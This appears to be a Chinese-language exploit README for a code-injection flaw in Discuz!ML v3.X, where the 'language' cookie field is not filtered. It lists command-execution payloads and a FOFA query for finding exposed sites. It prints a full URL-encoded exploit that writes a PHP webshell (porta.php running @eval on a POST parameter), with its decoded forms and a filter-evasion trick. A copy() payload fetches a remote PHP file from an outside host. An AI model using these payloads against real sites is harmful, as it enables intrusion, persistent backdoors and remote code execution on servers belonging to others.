[discuzML官网](http://discuz.ml/download)

漏洞发生的版本为 Discuz 国际版。Discuz!ML v3.X

用户数量不多，所以影响不大 product of codersclub.org

cookie 中 language 字段未添加 过滤所致，可以上传一句话木马

payload

'.phpinfo().'

'.system(dir).'

'.whoami.'

'.system(whoami).'

'.file_put_contents(,).'

fofa 查询特征: ```2009-2019 codersclub.org```


poc.py 为网上公布的监测poc,误报率较高

exp.txt 为 我写的exp

test.php 为我写的exp经一次url解码

test_copy.php 为检测 copy函数的php代码，验证通过

exp内容：

```%27.%20file_put_contents%28%27porta.php%27%2Curldecode%28%27%253C%253Fphp%2520%2540eval%2528%2524_%27%29.strtoupper%28urldecode%28%27POST%27%29%29.urldecode%28%27%255B%2522lee%2522%255D%2529%253B%253F%253E%27%29%29.%27```

urldecode:

```'.file_put_contents('porta.php',urldecode('%3C%3Fphp%20%40eval%28%24_').strtoupper(urldecode('POST')).urldecode('%5B%22lee%22%5D%29%3B%3F%3E')).'```

二次urldecode:

```'. file_put_contents('porta.php',urldecode('<?php @eval($_').strtoupper(urldecode('POST')).urldecode('["lee"]);?>')).'```


使用 strtoupper  因为  discuz 会 str_replace 把大写字母都换成小写字母。导致 $_POST 变成 $_post 无法写一句话木马，所以把它转化为大写

.  php  字符串连接符

第二个exp我没有复现成功,报错 directory_notfound: ./data/template

利用php copy 函数,思路还是很不错的

```copy("http:".chr(47).chr(47)."192.168.1.101:8081".chr(47)."phpinfo.php","123.php")```

